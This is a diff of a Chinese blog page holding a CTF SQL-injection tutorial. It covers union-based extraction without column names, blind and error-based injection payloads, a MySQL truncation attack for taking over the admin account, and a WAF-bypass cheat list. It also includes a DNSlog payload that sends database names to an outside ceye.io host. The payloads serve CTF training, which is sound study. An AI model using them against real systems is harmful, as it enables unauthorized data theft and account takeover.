+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1</span><br></pre></td></tr></table></figure>
+
+<p>上面的语句图形化查询结果如表</p>
+<table>
+<thead>
+<tr>
+<th align="center">c1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+</tr>
+</tbody></table>
+<p>我们需要上面这样的列三个，因为目标表的列是三个（如果目标表查询的是五列，我们就需要构造五列）<br>然后我们把列组合在一起</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3</span><br></pre></td></tr></table></figure>
+
+<p>结果就是下面这样</p>
+<table>
+<thead>
+<tr>
+<th align="center">c1</th>
+<th align="center">c2</th>
+<th align="center">c3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">2</td>
+<td align="center">3</td>
+</tr>
+</tbody></table>
+<p>然后我们联合查询flag数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<table>
+<thead>
+<tr>
+<th align="center">c1</th>
+<th align="center">c2</th>
+<th align="center">c3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">2</td>
+<td align="center">3</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">admin</td>
+<td align="center">flag{this_is_flag}</td>
+</tr>
+</tbody></table>
+<p>现在我们把上面这个语句查询出来的表命名为t，然后我们查询这个表的c3字段,并取第二行的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> t.c3 <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span>)t <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就成功得到flag了</p>
+<table>
+<thead>
+<tr>
+<th align="center">c3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">flag{this_is_flag}</td>
+</tr>
+</tbody></table>
+<p>当然盲注我们是不能看到的，所以还需要mid或者substr进行切割，最终我们写脚本来进行未知列名的数据读取：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((<span class="keyword">select</span> t.c2 <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag)t <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'f'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>从上面看我们并没有用第三列的列名但是成功把第三列的数据取了出来，这就是三联表查询。很简单吧。</p>
+<h5 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h5><p>什么是参数污染？比如URL：<a href="http://www.xxxx.com/search.php?id=110&amp;id=911" target="_blank" rel="noopener">http://www.xxxx.com/search.php?id=110&amp;id=911</a><br>百度会理解成让百度搜索：110                  #选择了第一个参数,放弃了第二个参数。<br>雅虎会理解成让雅虎搜索：911　　           #选择了第二个参数,放弃了第一个参数。<br>谷歌会理解成让谷歌搜索：110 911           #两个参数同时选择。<br>主要的就是这三种情况了。<br>这主要是源于,不同的网站对处理参数的处理方式不同<br>倘若是第三种情况,也就是第一个参数取第二个参数也取。那么大家请看下面的URL<br><a href="http://www.xishaonian.com/hello.php?id=select" target="_blank" rel="noopener">http://www.xishaonian.com/hello.php?id=select</a> 1&amp;id=2,3,3 from admin<br>该种情况还可用于Bypass WAF.</p>
+<h5 id="DNSlogsql注入"><a href="#DNSlogsql注入" class="headerlink" title="DNSlogsql注入"></a>DNSlogsql注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\aa.'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'. vd85lw.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
+
+<p>相当于访问aa.ctf.yygta1.ceye.io DNS会记录下这个记录！注意网上的payload的concat后\会把单引号转义导致那个并不好用，就上面这个就挺好用的<br>推荐的平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p>
+<h5 id="mssql-mysql"><a href="#mssql-mysql" class="headerlink" title="mssql+mysql"></a>mssql+mysql</h5><p>mssql+mysql 可以在mssql中执行mysql的查询语句：<br>参考个链接吧 没细致研究,只是见过<br><a href="https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017</a></p>
+<h5 id="MYSQL约束攻击："><a href="#MYSQL约束攻击：" class="headerlink" title="MYSQL约束攻击："></a>MYSQL约束攻击：</h5><p>对于长度有限制的字符串如果插入超过定义的长度会自动截断：<br>比如 user列名长度10 我们注册admin admin 肯定不行，这是管理员的账户<br>如果我们注册admin+++++++++++++++ admin12345<br>那么我们仍然可以用admin12345登陆admin账号原因是+会变成空格 这在前端和都端验证中都会通过<br>例题： bugku的一道CTF题,地址:<a href="http://47.93.190.246:49163/" target="_blank" rel="noopener">http://47.93.190.246:49163/</a></p>
+<h5 id="mysql的弱类型-注入"><a href="#mysql的弱类型-注入" class="headerlink" title="mysql的弱类型-注入"></a>mysql的弱类型-注入</h5><p>mysql和php一样都是弱类型语言，你可以尝试select 0=’sadas’ 结果一定是1，这里不用特殊记忆，php会返回true的mysql都会返回true，由于这种弱类型，还衍生了一点弱类型注入的技巧。<br>比如一个注册的insert 注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=6677%40qq.com&amp;username=0'%2bsubstr((<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> t.c <span class="keyword">from</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)t)))) <span class="keyword">from</span> <span class="number">20</span>)%<span class="number">2</span>b<span class="string">'0&amp;password=22</span></span><br></pre></td></tr></table></figure>
+
+<p>isert注入通过登录后的用户名来看回显 为了有回显 我们 0’+hex(hex(语句))+’0  由于弱类型加强制转换 我们的username就成为了我们注入数据的两次 hex值（注意这里必须用%2b +可能被当成空格或者%20 所以先编码 浏览器自己会解码这样就不会产生歧义），为什么不直接用字符串拼接呢，就像’0’+user()+’0’ ,不好意思这样只会返回0 因为”+”只适合整数相加,不适合字符串。<br>两次 hex是为了杜绝 0+33a1df+0=33这种情况，为的是把数值变成字符开头而不是数字开头的十六进制字符串。这样我们得到的用户名就是我们查询结果的两次十六进制编码。</p>
+<h5 id="同表查询"><a href="#同表查询" class="headerlink" title="同表查询"></a>同表查询</h5><p>有时候information 或者 or、select 被过滤，导致我们无法直接查询information_schema中的库名和表名。这个时候可能题目就没想让我们去information_Schema中找东西。应该尝试同表查询，还拿上面的flag表举例，如果注入语句只是查询username，那么我们可以：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">mid</span>(flag,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'f'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>同表是直接可以查的，直接切就行，有时候这个技巧还听常用。</p>
+<h5 id="mysql-另类攻击"><a href="#mysql-另类攻击" class="headerlink" title="mysql 另类攻击"></a>mysql 另类攻击</h5><p>有时候sql注入不是单独出现的，比如结合php的弱类型，在登陆的时候希望username返回一个null，来进行弱类型比较，那么mysql注入也可以：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">with</span> <span class="keyword">rollup</span></span><br></pre></td></tr></table></figure>
+
+<p>图形查询结果：</p>
+<table>
+<thead>
+<tr>
+<th align="center">username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">admin</td>
+</tr>
+<tr>
+<td align="center">null</td>
+</tr>
+</tbody></table>
+<p>可以通过limit 来返回一个null。当然这个技巧很少用。</p>
+<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p>AllowArbitraryServer 开启的情况下开启的情况下可能存在任意文件读取，可以把本地文件读取到远程mysql服务器上，具体操作是vps启动mysql服务器用phpmyadmin的后台登陆去登陆我们的mysql服务器，我们的服务器就会记录下我们所需要的文件，当然vps的mysql服务器需要配置，主要用在phpmyadmin界面的登陆中，写起来太长了，直接给个链接吧。<br><a href="https://bbs.pediy.com/thread-248424.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248424.htm</a></p>
+<h5 id="利用数据库操作异常进行注入"><a href="#利用数据库操作异常进行注入" class="headerlink" title="利用数据库操作异常进行注入"></a>利用数据库操作异常进行注入</h5><p>有时候我们见到的题目sql语句执行不成功会报错，但是所有报错都是同样的样式，没办法通过报错注入来进行数据泄露。那么我们还可以用这种数据库异常来进行盲注（类似boolean盲注）。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 主要有以下几种玩儿法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于 and 的特性 0 and sql 这里的sql不会执行，因为0 and 任何 都是 0，所以不会接着执行</span></span><br><span class="line">'123' and ascii(mid(&#123;sql&#125;,&#123;index&#125;,1))=&#123;char&#125; and (select exp(~(select * from(select user())x)));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 0+~0 返回一串整形数字  1+~0 报错</span></span><br><span class="line">'1' and (<span class="keyword">select</span> (<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> t<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">user</span> )t <span class="keyword">LIMIT</span> <span class="number">1</span> </span><br><span class="line"><span class="keyword">OFFSET</span> <span class="number">1</span>),&#123;i&#125;,<span class="number">1</span>))=&#123;j&#125;)+~<span class="number">0</span>)<span class="comment">#.format(i=i,j=j);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这个是 基于and的例子 pow() 也是会报错 所以 and + 很多sql函数 都可以这样玩儿</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">mid</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'b'</span> <span class="keyword">and</span> <span class="keyword">pow</span>(<span class="number">222</span>,<span class="number">222222</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="当所有比较符号被过滤"><a href="#当所有比较符号被过滤" class="headerlink" title="当所有比较符号被过滤"></a>当所有比较符号被过滤</h5><p>记住还有 REGEXP</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.106.184.130:8082/index.php?id=1^(mid(length(database()),1,2)+regexp+%27^32%27)</span><br></pre></td></tr></table></figure>
+
+<h5 id="渗透测试中比较好用的知识点"><a href="#渗透测试中比较好用的知识点" class="headerlink" title="渗透测试中比较好用的知识点"></a>渗透测试中比较好用的知识点</h5><ul>
+<li>参数污染</li>
+<li>IIS 特性unicode绕过  s%u0065lect 使用hackbar编码</li>
+<li>使用chunk提交数据</li>
+<li>sqlserver 可以 ；号结束命令</li>
+<li>mysql内联注释</li>
+<li>特殊字符 %00 %0d %0a</li>
+<li>空白字符<br>mysql5：OA OB OC OD AO 20<br>MSSQL:01,02 到 09，0A到0F,10到19，1A到1F,20 </li>
+<li>括号绕过空格 union(select)</li>
+<li>插入emoji / 小语种文字</li>
+<li>使用sqlmap tamper</li>
+<li>科学计数法绕过空格 8e0union</li>
+<li>无回显，无特征，善用sleep()</li>
+</ul>
+<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>很少能打CTF了，以前打CTF竟是做注入的题，所以有很多经验，但再不总结可能就忘完了。这篇文章也不算是有技术含量，只是为CTF小白打点基础，开阔脑洞，毕竟sql注入题千变万化，越来越难了。最后希望有人能从这儿学到东西。</p>
 
       
 
@@ -316,7 +464,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2019/09/10/一道php代码审计题目的心路历程/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2018/11/01/CTF中的sql注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -330,18 +478,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/24/phpstudy漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/03/01/adb的简单使用/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          phpstudy后门事件
+          adb工具的使用笔记
         
       </div>
     </a>
   
   
-    <a href="/2019/09/07/MS-2019_0708复现笔记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MS2019_0708复现笔记</div>
+    <a href="/2018/10/01/我爱我的祖国/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">我爱我的祖国</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -368,7 +516,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#源码地址-amp-amp-一些交代"><span class="toc-number">2.</span> <span class="toc-text">源码地址&amp;&amp;一些交代</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#入手源码"><span class="toc-number">3.</span> <span class="toc-text">入手源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结束语"><span class="toc-number">4.</span> <span class="toc-text">结束语</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF-sql注入三原则"><span class="toc-number">2.</span> <span class="toc-text">CTF sql注入三原则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql注入流程"><span class="toc-number">3.</span> <span class="toc-text">sql注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始注入"><span class="toc-number">4.</span> <span class="toc-text">开始注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fuzz"><span class="toc-number">4.1.</span> <span class="toc-text">fuzz</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#绕过waf"><span class="toc-number">4.2.</span> <span class="toc-text">绕过waf</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#还有一些小众的技巧"><span class="toc-number">5.</span> <span class="toc-text">还有一些小众的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#无法获取列名如何取数据"><span class="toc-number">5.1.</span> <span class="toc-text">无法获取列名如何取数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP参数污染"><span class="toc-number">5.2.</span> <span class="toc-text">HTTP参数污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSlogsql注入"><span class="toc-number">5.3.</span> <span class="toc-text">DNSlogsql注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mssql-mysql"><span class="toc-number">5.4.</span> <span class="toc-text">mssql+mysql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MYSQL约束攻击："><span class="toc-number">5.5.</span> <span class="toc-text">MYSQL约束攻击：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mysql的弱类型-注入"><span class="toc-number">5.6.</span> <span class="toc-text">mysql的弱类型-注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#同表查询"><span class="toc-number">5.7.</span> <span class="toc-text">同表查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mysql-另类攻击"><span class="toc-number">5.8.</span> <span class="toc-text">mysql 另类攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#任意文件读取"><span class="toc-number">5.9.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用数据库操作异常进行注入"><span class="toc-number">5.10.</span> <span class="toc-text">利用数据库操作异常进行注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#当所有比较符号被过滤"><span class="toc-number">5.11.</span> <span class="toc-text">当所有比较符号被过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#渗透测试中比较好用的知识点"><span class="toc-number">5.12.</span> <span class="toc-text">渗透测试中比较好用的知识点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结语"><span class="toc-number">6.</span> <span class="toc-text">结语</span></a></li></ol>
                     </div>
                 </span>
             </div>
